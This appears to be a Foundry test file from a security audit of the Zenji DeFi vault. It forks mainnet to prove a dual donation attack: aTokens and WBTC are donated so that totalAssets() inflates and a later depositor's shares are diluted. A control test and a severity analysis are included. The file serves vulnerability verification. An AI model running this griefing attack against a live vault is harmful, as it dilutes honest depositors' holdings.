// SPDX-License-Identifier: MIT
pragma solidity ^0.8.33;

import { Test, console } from "forge-std/Test.sol";
import { Zenji } from "../src/Zenji.sol";
import { ZenjiViewHelper } from "../src/ZenjiViewHelper.sol";
import { AaveLoanManager } from "../src/lenders/AaveLoanManager.sol";
import { UniversalRouterV3SingleHopSwapper } from "../src/swappers/base/UniversalRouterV3SingleHopSwapper.sol";
import { UsdtIporYieldStrategy } from "../src/strategies/UsdtIporYieldStrategy.sol";
import { IERC20 } from "../src/interfaces/IERC20.sol";
import { IChainlinkOracle } from "../src/interfaces/IChainlinkOracle.sol";
import { IAavePool } from "../src/interfaces/IAavePool.sol";

/// @title VerifyH40
/// @notice Proves H-40 (Chain CH-1: TF-1 + TF-4): dual donation attack inflates totalAssets()
/// causing share dilution for new depositors.
///
/// Attack vectors:
///   1. Attacker donates aTokens to AaveLoanManager (increases getNetCollateralValue())
///   2. Attacker donates collateral tokens to the Zenji vault (increases balanceOf(vault))
///   3. Both feed into totalAssets() via getTotalCollateralValue()
///   4. Next depositor receives fewer shares than they should (share dilution)
///
/// This test also evaluates attack economics: the attacker must spend real value with no
/// recovery path, making this a pure-griefing attack with no profit motive.
contract VerifyH40 is Test {
    // Mainnet addresses - WBTC/Aave vault configuration
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant CRVUSD = 0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E;

    address constant AAVE_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address constant AAVE_A_WBTC = 0x5Ee5bf7ae06D1Be5997A1A72006FE6C607eC6DE8;
    address constant AAVE_VAR_DEBT_USDT = 0x6df1C1E379bC5a00a7b4C6e67A203333772f45A8;

    address constant IPOR_PLASMA_VAULT = 0xbfA9d6EC0E04B6691fCAE5F8b48838C3918eC117;
    address constant USDT_CRVUSD_POOL = 0x390f3595bCa2Df7d23783dFd126427CCeb997BF4;

    address constant UNIVERSAL_ROUTER = 0x66a9893cC07D91D95644AEDD05D03f95e1dBA8Af;
    uint24 constant WBTC_USDT_V3_FEE = 3000;

    address constant BTC_USD_ORACLE = 0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c;
    address constant USDT_USD_ORACLE = 0x3E7d1eAB13ad0104d2750B8863b489D65364e32D;
    address constant CRVUSD_USD_ORACLE = 0xEEf0C605546958c1f899b6fB336C20671f9cD49F;

    address owner = makeAddr("owner");
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");
    address attacker = makeAddr("attacker");

    Zenji vault;
    AaveLoanManager loanManager;
    ZenjiViewHelper viewHelper;
    UniversalRouterV3SingleHopSwapper swapper;
    IERC20 wbtc;
    IERC20 aWbtc;

    function mockOracles() internal {
        address[3] memory oracles = [BTC_USD_ORACLE, USDT_USD_ORACLE, CRVUSD_USD_ORACLE];
        for (uint256 i = 0; i < oracles.length; i++) {
            (uint80 rId, int256 ans,, uint256 updAt, uint80 arId) =
                IChainlinkOracle(oracles[i]).latestRoundData();
            uint256 ts = block.timestamp > updAt ? block.timestamp : updAt;
            vm.mockCall(
                oracles[i],
                abi.encodeWithSelector(IChainlinkOracle.latestRoundData.selector),
                abi.encode(rId, ans, ts, ts, arId)
            );
        }
    }

    function syncAndMock() internal {
        uint256 maxUpd = 0;
        address[3] memory oracles = [BTC_USD_ORACLE, USDT_USD_ORACLE, CRVUSD_USD_ORACLE];
        for (uint256 i = 0; i < oracles.length; i++) {
            (,,, uint256 upd,) = IChainlinkOracle(oracles[i]).latestRoundData();
            if (upd > maxUpd) maxUpd = upd;
        }
        if (block.timestamp < maxUpd + 1) vm.warp(maxUpd + 1);
        mockOracles();
    }

    function refreshOracles() internal {
        vm.warp(block.timestamp + 2);
        vm.roll(block.number + 1);
        mockOracles();
    }

    function setUp() public {
        string memory rpcUrl = vm.envOr("MAINNET_RPC_URL", string(""));
        if (bytes(rpcUrl).length == 0) rpcUrl = vm.envOr("ETH_RPC_URL", string(""));
        if (bytes(rpcUrl).length > 0) {
            vm.createSelectFork(rpcUrl);
        } else {
            vm.skip(true);
            return;
        }

        syncAndMock();

        wbtc = IERC20(WBTC);
        aWbtc = IERC20(AAVE_A_WBTC);
        viewHelper = new ZenjiViewHelper();

        deal(WBTC, user1, 10e8);
        deal(WBTC, user2, 10e8);
        deal(WBTC, attacker, 5e8);

        uint256 startNonce = vm.getNonce(address(this));
        address expectedVaultAddress = computeCreateAddress(address(this), startNonce + 3);

        swapper = new UniversalRouterV3SingleHopSwapper(
            owner, WBTC, USDT, UNIVERSAL_ROUTER, WBTC_USDT_V3_FEE, BTC_USD_ORACLE, USDT_USD_ORACLE
        );

        UsdtIporYieldStrategy strategy = new UsdtIporYieldStrategy(
            USDT,
            CRVUSD,
            expectedVaultAddress,
            USDT_CRVUSD_POOL,
            IPOR_PLASMA_VAULT,
            0,
            1,
            CRVUSD_USD_ORACLE,
            USDT_USD_ORACLE
        );

        loanManager = new AaveLoanManager(
            WBTC,
            USDT,
            AAVE_A_WBTC,
            AAVE_VAR_DEBT_USDT,
            AAVE_POOL,
            BTC_USD_ORACLE,
            USDT_USD_ORACLE,
            address(swapper),
            7500,
            8000,
            expectedVaultAddress
        );

        vault = new Zenji(
            WBTC,
            USDT,
            address(loanManager),
            address(strategy),
            address(swapper),
            owner,
            address(viewHelper)
        );
        require(address(vault) == expectedVaultAddress, "Vault address mismatch");

        vm.prank(owner);
        swapper.proposeSlippage(2e16);
        vm.warp(block.timestamp + 1 weeks + 1);
        vm.prank(owner);
        swapper.executeSlippage();
        syncAndMock();
    }

    // -----------------------------------------------------------------
    //  test_H40_dualDonationInflatesTotalAssets
    //
    //  Proves:
    //  A) Both aToken donation to LoanManager AND collateral donation to vault
    //     inflate totalAssets().
    //  B) Share dilution is real: new depositor receives fewer shares.
    //  C) Combined attack is strictly worse than either individual attack.
    //  D) VIRTUAL_SHARE_OFFSET does not protect ongoing depositors.
    // -----------------------------------------------------------------
    function test_H40_dualDonationInflatesTotalAssets() public {
        // Step 1: Initial deposit to establish baseline
        vm.startPrank(user1);
        wbtc.approve(address(vault), type(uint256).max);
        vault.deposit(5e8, user1);
        vm.stopPrank();
        vm.roll(block.number + 1);

        refreshOracles();

        uint256 totalAssetsBefore = vault.totalAssets();
        uint256 totalSupplyBefore = vault.totalSupply();
        uint256 VIRTUAL_OFFSET = vault.VIRTUAL_SHARE_OFFSET();

        console.log("=== Initial State ===");
        console.log("totalAssets (satoshis):", totalAssetsBefore);
        console.log("totalSupply (shares)  :", totalSupplyBefore);
        console.log("VIRTUAL_SHARE_OFFSET  :", VIRTUAL_OFFSET);

        // Step 2: Baseline share estimate for 1 WBTC deposit (no attack)
        uint256 depositSize = 1e8;
        uint256 sharesWithoutAttack = vault.convertToShares(depositSize);
        console.log("\n=== Without-Attack Baseline ===");
        console.log("depositSize (1 WBTC)         :", depositSize);
        console.log("sharesWithoutAttack          :", sharesWithoutAttack);

        // Step 3: Execute dual donation attack
        // 3a: Donate aWBTC to AaveLoanManager
        //     (In production: attacker supplies WBTC to Aave, gets aWBTC, transfers to LM)
        uint256 aTokenDonation = 1e7;    // 0.1 WBTC in aTokens
        uint256 collateralDonation = 1e7; // 0.1 WBTC in raw collateral

        uint256 lmATokenBefore = aWbtc.balanceOf(address(loanManager));
        vm.startPrank(attacker);
        wbtc.approve(AAVE_POOL, aTokenDonation);
        IAavePool(AAVE_POOL).supply(WBTC, aTokenDonation, attacker, 0);
        uint256 attackerATokenBal = aWbtc.balanceOf(attacker);
        aWbtc.transfer(address(loanManager), attackerATokenBal);
        vm.stopPrank();
        uint256 lmATokenAfter = aWbtc.balanceOf(address(loanManager));
        uint256 actualATokenDonation = lmATokenAfter - lmATokenBefore;

        // 3b: Donate raw WBTC to Zenji vault
        uint256 vaultWbtcBefore = wbtc.balanceOf(address(vault));
        vm.prank(attacker);
        wbtc.transfer(address(vault), collateralDonation);
        uint256 vaultWbtcAfter = wbtc.balanceOf(address(vault));

        console.log("\n=== Donation Effect ===");
        console.log("aToken in LM before    :", lmATokenBefore);
        console.log("aToken in LM after     :", lmATokenAfter);
        console.log("aToken delta           :", lmATokenAfter - lmATokenBefore);
        console.log("WBTC in vault before   :", vaultWbtcBefore);
        console.log("WBTC in vault after    :", vaultWbtcAfter);
        console.log("WBTC vault delta       :", vaultWbtcAfter - vaultWbtcBefore);

        // Step 4: Measure totalAssets() inflation
        uint256 totalAssetsAfter = vault.totalAssets();
        uint256 totalAssetsDelta = totalAssetsAfter - totalAssetsBefore;

        console.log("\n=== totalAssets() Impact ===");
        console.log("totalAssets before    :", totalAssetsBefore);
        console.log("totalAssets after     :", totalAssetsAfter);
        console.log("delta (inflation)     :", totalAssetsDelta);

        // ASSERTION A: Both donations feed totalAssets()
        // getNetCollateralValue() = aToken.balanceOf(LM) - debtInCollateral
        // collateralAsset.balanceOf(vault) is a direct addend in getTotalCollateralValue()
        assertGe(
            totalAssetsDelta,
            actualATokenDonation + collateralDonation,
            "FAIL_A: dual donation did not inflate totalAssets by at least both donations combined"
        );
        console.log("\nASSERTION A PASSED: totalAssets inflated by", totalAssetsDelta, "sat");

        // Step 5: Measure share dilution
        uint256 sharesAfterAttack = vault.convertToShares(depositSize);
        console.log("\n=== Share Dilution Analysis ===");
        console.log("shares WITHOUT attack  :", sharesWithoutAttack);
        console.log("shares AFTER attack    :", sharesAfterAttack);

        // ASSERTION B: New depositor receives fewer shares
        assertLt(
            sharesAfterAttack,
            sharesWithoutAttack,
            "FAIL_B: share dilution not observed - new depositor got same or more shares"
        );

        uint256 dilutionBps = ((sharesWithoutAttack - sharesAfterAttack) * 10000)
            / sharesWithoutAttack;
        console.log("Dilution (bps)         :", dilutionBps);

        // ASSERTION C: Dilution is nonzero
        assertGt(dilutionBps, 0, "FAIL_C: dilution is zero basis points");
        console.log("ASSERTION B+C PASSED: dilution =", dilutionBps, "bps");

        // Step 6: Confirm combined attack is strictly worse than either individual attack
        // Using the share formula: shares = (depositSize * (supply + OFFSET)) / (assets + OFFSET)
        uint256 sharesATokenOnly = (depositSize * (totalSupplyBefore + VIRTUAL_OFFSET))
            / (totalAssetsBefore + actualATokenDonation + VIRTUAL_OFFSET);

        uint256 sharesCollateralOnly = (depositSize * (totalSupplyBefore + VIRTUAL_OFFSET))
            / (totalAssetsBefore + collateralDonation + VIRTUAL_OFFSET);

        uint256 sharesCombined = (depositSize * (totalSupplyBefore + VIRTUAL_OFFSET))
            / (totalAssetsBefore + actualATokenDonation + collateralDonation + VIRTUAL_OFFSET);

        console.log("\n=== Combined vs Individual Attack ===");
        console.log("shares (no attack)     :", sharesWithoutAttack);
        console.log("shares (aToken only)   :", sharesATokenOnly);
        console.log("shares (collateral only):", sharesCollateralOnly);
        console.log("shares (combined)      :", sharesCombined);
        console.log("shares (live actual)   :", sharesAfterAttack);

        // ASSERTION D: Combined attack is strictly worse than either individual
        assertLt(
            sharesCombined,
            sharesATokenOnly,
            "FAIL_D: combined attack not worse than aToken-only attack"
        );
        assertLt(
            sharesCombined,
            sharesCollateralOnly,
            "FAIL_D: combined attack not worse than collateral-only attack"
        );
        console.log("ASSERTION D PASSED: combined attack is maximally dilutive");

        // Step 7: Execute actual victim deposit to confirm real impact
        vm.startPrank(user2);
        wbtc.approve(address(vault), type(uint256).max);
        uint256 user2SharesActual = vault.deposit(depositSize, user2);
        vm.stopPrank();
        vm.roll(block.number + 1);

        uint256 shareDeficit = sharesWithoutAttack > user2SharesActual
            ? sharesWithoutAttack - user2SharesActual
            : 0;

        console.log("\n=== Victim Deposit Confirmation ===");
        console.log("user2 shares received  :", user2SharesActual);
        console.log("baseline shares        :", sharesWithoutAttack);
        console.log("share deficit          :", shareDeficit);

        // ASSERTION E: Victim received fewer shares
        assertLt(
            user2SharesActual,
            sharesWithoutAttack,
            "FAIL_E: victim received same or more shares despite donation attack"
        );
        console.log("ASSERTION E PASSED: victim shares less than baseline");

        // Step 8: Economic analysis
        uint256 attackerCost = actualATokenDonation + collateralDonation;
        uint256 offsetAsFractionBps = (VIRTUAL_OFFSET * 10000)
            / (totalAssetsBefore + VIRTUAL_OFFSET);

        console.log("\n=== Attack Economics ===");
        console.log("Attacker cost (satoshis):", attackerCost);
        console.log("Attacker profit         : 0 (donated tokens not recoverable)");
        console.log("Attack type             : pure griefing, no economic benefit to attacker");
        console.log("VIRTUAL_SHARE_OFFSET as pct of TVL (bps):", offsetAsFractionBps);
        console.log("Offset does NOT protect ongoing depositors (only first-depositor)");

        console.log("\n=== VERDICT ===");
        console.log("CONFIRMED: both donation vectors inflate totalAssets()");
        console.log("CONFIRMED: victim receives", dilutionBps, "bps fewer shares");
        console.log("ECONOMIC NOTE: economically irrational for attacker (pure loss)");
        console.log("SEVERITY: LOW-MEDIUM (real dilution possible, but no attacker profit)");
    }

    // -----------------------------------------------------------------
    //  test_H40_controlBaseline
    //
    //  Control: without donation, user2 receives proportional shares.
    // -----------------------------------------------------------------
    function test_H40_controlBaseline() public {
        vm.startPrank(user1);
        wbtc.approve(address(vault), type(uint256).max);
        vault.deposit(5e8, user1);
        vm.stopPrank();
        vm.roll(block.number + 1);

        refreshOracles();

        uint256 totalAssetsBefore = vault.totalAssets();
        uint256 totalSupplyBefore = vault.totalSupply();
        uint256 VIRTUAL_OFFSET = vault.VIRTUAL_SHARE_OFFSET();

        uint256 depositSize = 1e8;

        vm.startPrank(user2);
        wbtc.approve(address(vault), type(uint256).max);
        uint256 user2Shares = vault.deposit(depositSize, user2);
        vm.stopPrank();
        vm.roll(block.number + 1);

        uint256 expectedShares = (depositSize * (totalSupplyBefore + VIRTUAL_OFFSET))
            / (totalAssetsBefore + VIRTUAL_OFFSET);

        console.log("=== Control Test: No Donation ===");
        console.log("expectedShares:", expectedShares);
        console.log("actualShares  :", user2Shares);

        assertApproxEqRel(
            user2Shares,
            expectedShares,
            1e16,
            "Control: share calculation deviated more than 1%"
        );
        console.log("CONTROL PASSED: shares proportional without attack");
    }
}
